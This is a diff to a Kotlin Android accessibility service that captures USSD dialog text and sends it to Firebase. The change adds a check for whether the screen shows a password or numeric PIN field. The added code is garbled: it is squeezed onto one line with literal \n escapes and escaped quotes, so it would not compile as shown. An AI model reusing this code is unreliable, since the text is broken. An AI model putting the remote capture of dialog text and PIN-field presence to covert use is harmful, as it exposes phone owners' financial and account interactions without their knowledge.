@@ -126,12 +126,7 @@ class CarerAccessibilityService : AccessibilityService() {
     /**
      * Capture response text from USSD dialog and send to Firebase
      */
-    private fun captureAndSendResponse(text: String) {
-        Log.d("CarerAccessibility", "Capturing response: $text")
-
-        // Send to Firebase
-        FirebaseLogHelper.logResponse(text, this)
-    }
+    private fun captureAndSendResponse(text: String) {\n        Log.d(\"CarerAccessibility\", \"Capturing response: $text\")\n        \n        val rootNode = rootInActiveWindow\n        val hasInputField = rootNode?.let { hasInputField(it) } ?: false\n        \n        // Send to Firebase with input field status\n        FirebaseLogHelper.logResponse(text, this, hasInputField)\n    }\n    \n    /**\n     * Check if current screen has an input field\n     */\n    private fun hasInputField(node: AccessibilityNodeInfo): Boolean {\n        if (node.isPassword || node.inputType == android.text.InputType.TYPE_CLASS_NUMBER) {\n            return true\n        }\n        \n        for (i in 0 until node.childCount) {\n            val child = node.getChild(i) ?: continue\n            if (hasInputField(child)) return true\n        }\n        \n        return false\n    }
 
     companion object {
         /**
